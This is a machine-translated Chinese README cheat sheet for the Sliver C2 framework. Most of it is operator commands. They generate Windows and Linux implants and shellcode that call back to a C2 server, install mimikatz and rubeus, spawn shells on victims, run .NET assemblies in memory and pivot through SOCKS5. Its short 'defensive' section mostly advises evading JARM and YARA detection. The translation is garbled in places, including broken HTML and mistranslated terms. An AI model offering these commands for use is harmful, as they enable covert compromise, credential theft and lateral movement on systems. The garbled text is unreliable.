<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="红队">
</p>

<p对齐=“中心”>
  <b>⚔️ 现代、跨平台、开源对手模拟和命令与控制框架，支持 mTLS、WireGuard、HTTP(S) 和 DNS 协议</b>
</p>

---

## 📋 目录

- [概述与架构](#-overview--architecture)
- [安装和服务器设置](#-installation--server-setup)
  - [自动单线安装](#automated-one-liner-install)
  - [多人操作员配置](#multiplayer-operator-configuration)
- [侦听器配置（mTLS、HTTP、WireGuard、DNS）](#-listener-configuration-mtls-http-wireguard-dns)
- [生成植入物（信标与会话）](#-geneating-implants-beacons-vs-sessions)
  - [交互式会话与异步信标](#interactive-sessions-vs-asynchronous-beacons)
  - [Windows EXE 和 Shellcode 植入](#windows-exe--shellcode-implants)
  - [Linux 和 macOS ELF 植入](#linux--macos-elf-implants)
- [后开发和军械库生态系统](#-post-exploitation--armory-ecosystem)
  - [安装军械库扩展（BOF、甜甜圈、安全带）](#installing-armory-extensions-bofs-donut-seatbelt)
  - [凭证访问和 Mimikatz](#credential-access--mimikatz)
  - [旋转和动态 SOCKS5](#pivoting--dynamic-socks5)
- [快速参考表](#-quick-reference-table)
- [防守考虑与检测](#-defective-considerations--detection)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述与架构

**Sliver** 由 **Bishop Fox** 在 Go 中设计，是商业 C2 框架（Cobalt Strike、Brute Ratel）的首要开源替代品之一：
- **跨平台：** 服务器和植入程序跨 `x86_64`、`arm64` 和 `arm` 支持 Windows、Linux 和 macOS。
- **规避通信：** 对相互 TLS (mTLS)、WireGuard UDP 隧道、具有程序金丝雀生成功能的 HTTP/HTTPS 以及 DNS 隧道的开箱即用支持。
- **内存中执行：** 本机反射 DLL 注入、信标对象文件 (BOF)、通过 Donut 的内联 .NET 执行以及进程空洞。
- **多人游戏架构：** 多个红队操作员之间通过加密签名的操作员配置文件进行实时协作。

---

## 📥 安装和服务器设置

### 自动单行安装
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### 多人游戏操作员配置
在 C2 服务器上为团队成员创建操作员配置文件：
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 侦听器配置（mTLS、HTTP、WireGuard、DNS）

`sliver` 控制台内部：
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 生成植入物（信标与会话）

### 交互式会话与异步信标
- **会话：** 具有即时命令响应的实时 TCP/TLS 连接。更高的网络知名度。
- **信标：** 异步心跳，以随机抖动间隔休眠。 SOC 通过网络异常分析来识别的难度极大。

### Windows EXE 和 Shellcode 植入
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Linux 和 macOS ELF 植入
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ 后开发和军械库生态系统

### 安装军械库扩展（BOF、甜甜圈、安全带）
Armory 是 Sliver 的集成包管理器，用于第三方攻击工具和 Cobalt Strike Beacon 对象文件 (BOF)：
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### 与会话和信标交互
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### 旋转和动态 SOCKS5
将外部攻击工具直接路由到受感染的目标网络：
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **启动 mTLS 侦听器** | `mtls --lport 8888` |
| **启动 HTTPS 侦听器** | `https --lport 443 --domain c2.domain.com` |
| **生成会话 EXE** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **生成信标 EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **生成原始 Shellcode** | `generate --mtls <IP>:8888 -f shellcode` |
| **列出和互动会话**| `sessions` -> `use <ID>` |
| **安装军械库工具** | `armory install seatbelt mimikatz` |
| **内存中 .NET 执行**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 反向代理** | `socks5 start --port 1080` |

---

## 🛡️ 防守考虑和检测

1. **JARM 指纹识别：** 可以使用主动 JARM TLS 指纹识别来分析默认 Sliver HTTP 侦听器。在 Sliver 配置中自定义 TLS 密码。
2. **YARA 和二进制分析：** `generate` 生成的默认植入程序包含 Golang 元数据和符号结构，除非通过乱码 (`--skip-symbols`) 进行混淆。

---

## ⚠️ 法律免责声明

> [!警告]
> Sliver 是一种先进的对手模拟和红队指挥与控制框架。它必须专门部署在具有明确交战规则 (RoE) 的授权交战中。未经授权在第三方计算机上使用是严格违法的。